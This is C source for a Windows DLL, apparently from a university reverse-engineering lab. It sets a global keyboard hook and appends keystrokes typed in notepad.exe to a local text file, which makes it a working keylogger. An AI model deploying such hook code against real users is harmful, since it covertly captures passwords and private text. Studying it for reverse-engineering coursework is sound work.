#include "stdio.h"
#include "windows.h"
#include "tchar.h"

HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
//FILE* f1;
FILE* fp;
char ch;
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved) {
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		g_hInstance = (HINSTANCE)hinstDLL;
		//MessageBox(NULL, TEXT("Process Load Dll Success!"), TEXT("Tips"), MB_OK);
		break;
	case DLL_PROCESS_DETACH:
		//MessageBox(NULL, TEXT("Process Unload Dll Success!"), TEXT("Tips"), MB_OK);
		break;
	case DLL_THREAD_ATTACH:
		//MessageBox(NULL, TEXT("Thread load Dll Success!"), TEXT("Tips"), MB_OK);
		break;
	case DLL_THREAD_DETACH:
		//MessageBox(NULL, TEXT("Thread Unload Dll Success!"), TEXT("Tips"), MB_OK);
		break;
	}
	return TRUE;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	TCHAR szPath[MAX_PATH] = { 0, };
	TCHAR* p = NULL;

	if (nCode >= 0) {
		if (!(lParam & 0x80000000)) { //lParam的第31位（0：按键；1：释放键）
			fopen_s(&fp, "E:\\大学课程学习\\软件逆向工程\\第三次上机\\input.txt", "a+");
			GetModuleFileName(NULL, szPath, MAX_PATH);
			//MessageBox(NULL, szPath, TEXT("Tips"), MB_OK);
			p = _tcsrchr(szPath, '\\');
			//若装载当前DLL的进程为notepad.exe，则消息不会传递给下一个钩子
			if (!lstrcmpi(p + 1, _T("notepad.exe"))) {
				BYTE ks[256];
				GetKeyboardState(ks);
				WORD w;
				UINT scan;
				scan = 0;
				ToAscii(wParam, scan, ks, &w, 0);
				ch = (char)w;
				fwrite(&ch, sizeof(ch), 1, fp);
				
			}
			fclose(fp);	
		}
	}
	// 当前进程不是notepad.exe，将消息传递给下一个钩子
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void HkStart() {
		g_hHook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, g_hInstance, 0);

	}

	__declspec(dllexport) void HkStop() {
		if (g_hHook) {
			UnhookWindowsHookEx(g_hHook);
			g_hHook = NULL;
		}
	}
#ifdef __cplusplus
}
#endif


